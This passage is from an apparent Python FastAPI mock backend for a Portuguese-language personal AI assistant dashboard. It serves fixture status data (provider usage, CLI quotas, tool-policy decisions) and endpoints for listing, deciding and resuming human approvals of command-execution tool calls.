                        "provedores": {"gemini": 30, "groq": 8},
                        "trocas_do_gateway": 1,
                    },
                    {
                        "nome": "reserva",
                        "modelo": "llama-3.3-70b",
                        "camada": "pesado",
                        "chamadas": 6,
                        "ok": 3,
                        "falhas": 3,
                        "limitada": 3,
                        "pulos": 4,
                        "quarentena_s": 140,
                        "ultimo_ok": agora - 900,
                        "ultimo_erro": "HTTP 429",
                    },
                ],
            },
            "roteamento": {"ativo": True, "contagem": {"rapido": 12, "pesado": 3, "visao": 1}},
            "semana": [
                {
                    "dia": (datetime.now() - timedelta(days=6 - i)).strftime("%Y%m%d"),
                    "total": n,
                    "erros": 1 if i == 4 else 0,
                    "por_endpoint": {"omniroute": n} if n else {},
                }
                for i, n in enumerate([0, 3, 12, 7, 20, 5, 9])
            ],
            "clis": [
                {
                    "nome": "claude",
                    "instalada": True,
                    "usadas_hoje": 4,
                    "limite_diario": 20,
                    "restante": 16,
                },
                {
                    "nome": "gemini",
                    "instalada": True,
                    "usadas_hoje": 20,
                    "limite_diario": 20,
                    "restante": 0,
                },
                {
                    "nome": "codex",
                    "instalada": False,
                    "usadas_hoje": 0,
                    "limite_diario": 20,
                    "restante": 20,
                },
            ],
            "aprovacoes": {
                "pendentes": len(pendentes),
                "itens": [
                    {
                        "id": k,
                        "ferramenta": "executar_comando",
                        "motivo": "execução fora da lista de leitura segura",
                        "idade_s": 30,
                        "expira_em_s": 570,
                    }
                    for k in pendentes
                ],
            },
            "decisoes": {
                "janela_h": 24,
                "total": 12,
                "truncado": False,
                "por_acao": {"allow": 9, "confirm": 2, "deny": 1},
                "mais_usadas": [
                    {"ferramenta": "buscar_memoria", "n": 6},
                    {"ferramenta": "ler_arquivo", "n": 3},
                ],
                "recentes": [
                    {
                        "ts": agora - 60,
                        "ferramenta": "executar_comando",
                        "acao": "confirm",
                        "risco": "exec",
                        "motivo": "execução: pede confirmação",
                    },
                    {
                        "ts": agora - 600,
                        "ferramenta": "ferramenta_x",
                        "acao": "deny",
                        "risco": None,
                        "motivo": "ferramenta sem classe de risco",
                    },
                    {
                        "ts": agora - 900,
                        "ferramenta": "buscar_memoria",
                        "acao": "allow",
                        "risco": "read",
                        "motivo": "",
                    },
                ],
            },
            "avisos": {"pendentes": 2},
            "jobs": {"ativo": True, "ultima_rodada": agora - 20, "erros": []},
            "memoria": {"ok": True, "vetores": True},
            "canais": {"telegram": True},
            "voz": {
                "clique": {"ligada": True, "fala": True, "turnos": 7},
                "ao_vivo": {"ligada": True, "sessoes": 2, "ativas": 0, "minutos": 12.5},
                "falhas": 0,
                "ultimo_erro": None,
            },
            "ferramentas": 41,
            "mcp": {"google": "ok (12 ferramentas)", "web": "falhou: TimeoutError"},
        }

    @app.get("/approvals")
    def aprovacoes(
        authorization: str | None = Header(default=None),
        orion_session: str | None = Cookie(default=None),
    ) -> list[dict[str, Any]]:
        _auth(authorization, orion_session)
        return [
            {
                "id": k,
                "tool": "executar_comando",
                "reason": "execução fora da lista de leitura segura",
                **v,
            }
            for k, v in ESTADO["aprovacoes"].items()
            if v["status"] == "pending"
        ]

    @app.post("/approvals/{aid}/decide")
    def decidir(
        aid: str,
        corpo: dict[str, Any],
        authorization: str | None = Header(default=None),
        orion_session: str | None = Cookie(default=None),
    ) -> dict[str, Any]:
        _auth(authorization, orion_session)
        a = ESTADO["aprovacoes"].get(aid)
        if not a:
            raise HTTPException(404, "aprovação inexistente")
        if a["status"] != "pending":
            raise HTTPException(409, f"aprovação não está pendente ({a['status']})")
        a["status"] = "approved" if corpo.get("approved") else "denied"
        return {"id": aid, "status": a["status"]}

    @app.post("/approvals/{aid}/resume")
    async def retomar(
        aid: str,
        authorization: str | None = Header(default=None),
        orion_session: str | None = Cookie(default=None),
    ) -> StreamingResponse:
        _auth(authorization, orion_session)
        a = ESTADO["aprovacoes"].get(aid)

        async def gerar():
            if not a or a["status"] != "approved":
                yield _sse({"error": "aprovação não está aprovada"})
                yield _sse("[DONE]")
                return
            a["status"] = "consumed"
            yield _sse(
                {"tool": {"name": "executar_comando", "decision": "allow", "approved": True}}
            )
            async for p in _pedacos(
                "Feito. Removi a pasta `antigos` de Downloads (42 arquivos, 1,3 GB).",
                ESTADO["delay"],
            ):
                yield _sse({"text": p})
            yield _sse("[DONE]")

        return StreamingResponse(gerar(), media_type="text/event-stream")

    @app.exception_handler(HTTPException)
    async def _http(_req, exc: HTTPException):
        return JSONResponse({"detail": exc.detail}, status_code=exc.status_code)

    app.mount("/ui", StaticFiles(directory=str(FRONT), html=True), name="front")
    return app


app = create_app()

if __name__ == "__main__":
    uvicorn.run(
        app, host="127.0.0.1", port=int(os.environ.get("MOCK_PORT", "8000")), log_level="warning"
    )
